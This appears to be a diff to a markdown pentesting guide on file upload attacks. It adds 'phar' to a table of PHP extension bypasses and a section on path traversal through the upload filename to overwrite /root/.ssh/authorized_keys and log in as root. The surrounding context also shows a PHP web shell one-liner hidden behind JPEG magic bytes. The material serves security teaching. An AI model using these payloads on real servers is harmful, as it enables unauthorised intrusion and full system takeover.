@@ -32,22 +32,22 @@ By doing this, the malicious file might bypass the server's validation system, w
 
 #### Possible Modifications
 
-| **Original Extension** | **Possible Derived Extensions** |
-| ---------------------- | ------------------------------- |
-| `php`                  | `php5, phtml, php4, php3, php7` |
-| `html`                 | `htm, htm5, shtml, xhtml`       |
-| `txt`                  | `text, log, conf, markdown`     |
-| `jpg`                  | `jpeg, jpe, jfif, bmp, png`     |
-| `gif`                  | `png, jpg, jpeg, bmp, tiff`     |
-| `pdf`                  | `txt, ps, html, jpg`            |
-| `csv`                  | `xls, xlsx, txt, json`          |
-| `py`                   | `py3, pyc, pyo, pyw, py5`       |
-| `mp4`                  | `mkv, avi, mov, flv, webm`      |
-| `docx`                 | `doc, odt, txt, pdf, html`      |
-| `xlsx`                 | `xls, ods, csv, txt, json`      |
-| `zip`                  | `tar, gz, tgz, rar, 7z`         |
-| `png`                  | `jpg, jpeg, bmp, gif, tiff`     |
-| `xml`                  | `xhtml, html, rdf, json`        |
+| **Original Extension** | **Possible Derived Extensions**       |
+| ---------------------- | ------------------------------------- |
+| `php`                  | `php5, phtml, php4, php3, php7, phar` |
+| `html`                 | `htm, htm5, shtml, xhtml`             |
+| `txt`                  | `text, log, conf, markdown`           |
+| `jpg`                  | `jpeg, jpe, jfif, bmp, png`           |
+| `gif`                  | `png, jpg, jpeg, bmp, tiff`           |
+| `pdf`                  | `txt, ps, html, jpg`                  |
+| `csv`                  | `xls, xlsx, txt, json`                |
+| `py`                   | `py3, pyc, pyo, pyw, py5`             |
+| `mp4`                  | `mkv, avi, mov, flv, webm`            |
+| `docx`                 | `doc, odt, txt, pdf, html`            |
+| `xlsx`                 | `xls, ods, csv, txt, json`            |
+| `zip`                  | `tar, gz, tgz, rar, 7z`               |
+| `png`                  | `jpg, jpeg, bmp, gif, tiff`           |
+| `xml`                  | `xhtml, html, rdf, json`              |
 We can also use **ffuf** to test which extensions are accepted by the server:
 ```bash
 ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions-big.txt:FUZZ -X POST \
@@ -122,6 +122,56 @@ To insert the Magic Bytes into the upload file is necessary to convert the hexad
 ```php
 echo 'FFD8FFDB' | xxd -r -p > exploit.php.jpg && echo '<?php system($_GET["cmd"]); ?>' >> exploit.php.jpg
 ```
+
+---
+
+## Using Non-Executable File Uploads
+
+A file upload vulnerability does not always allow direct code execution. In some cases, the backend does not interpret uploaded files (e.g., no PHP), so webshells are useless.
+
+However, the vulnerability can still be exploited by combining it with **Directory Traversal**.
+
+
+### Path Injection via Filename
+
+If the application does not sanitize the `filename` parameter, we can inject relative paths:
+
+```http
+Content-Disposition: form-data; name="file"; filename="../../../../../../../tmp/test.txt"
+```
+
+This may allow writing files **outside the upload directory**.
+
+The result is often blind, so success must be assumed and tested indirectly.
+
+### Arbitrary File Write - SSH Access
+
+Instead of uploading a shell, we overwrite sensitive files like:
+
+```text
+/root/.ssh/authorized_keys
+```
+
+Prepare a key:
+
+```bash
+ssh-keygen -t rsa -f fileup
+cat fileup.pub > authorized_keys
+```
+
+Upload it with traversal:
+
+```text
+filename=../../../../../../../root/.ssh/authorized_keys
+```
+
+### Access via SSH
+
+```bash
+ssh -i fileup root@target 
+```
+
+If successful, we get access without a password.
 
 
 ---
